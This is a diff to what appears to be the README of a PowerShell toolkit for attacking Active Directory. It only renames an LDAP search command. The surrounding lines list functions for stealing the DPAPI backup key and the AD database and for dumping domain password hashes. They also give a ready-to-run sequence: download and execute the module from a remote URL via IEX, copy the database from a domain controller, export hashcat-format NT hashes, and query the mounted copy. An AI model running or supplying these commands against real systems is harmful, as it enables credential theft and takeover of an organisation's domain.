@@ -10,7 +10,7 @@ Get-DpapiBackupKey              -   extracts the DPAPI backup key from Active Di
 Get-ADDatabase                  -   steals Active Directory database remotely
 Dump-ADDatabase                 -   dumps domain accounts from an offline Active Directory database, including password hashes
 Mount-ADDatabase                -   mounts an Active Directory database as a local LDAP server
-Invoke-LdapSearch               -   searchs for domain objects in a mounted Active Directory database
+Get-LdapObject                  -   searchs for domain objects in a mounted Active Directory database
 ```
 
 ## Requirements
@@ -36,7 +36,7 @@ PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercon
 PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -Credential ADATUM\Administrator
 PS C:\> Dump-ADDatabase | Format-Custom -View HashcatNT | Out-File -Encoding ascii ADATUM.hashes
 PS C:\> Mount-ADDatabase -AllowUpgrade -LdapPort 1389
-PS C:\> Invoke-LdapSearch -Server localhost:1389 -LdapFilter "(&(userAccountControl:1.2.840.113556.1.4.803:=65536)(!userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties * | Select sAMAccountName,servicePrincipalName
+PS C:\> Get-LdapObject -Server localhost:1389 -SearchBase "dc=adatum,dc=corp" -Filter "(&(userAccountControl:1.2.840.113556.1.4.803:=65536)(!userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties sAMAccountName,servicePrincipalName
 PS C:\> Umount-ADDatabase
 ```
 
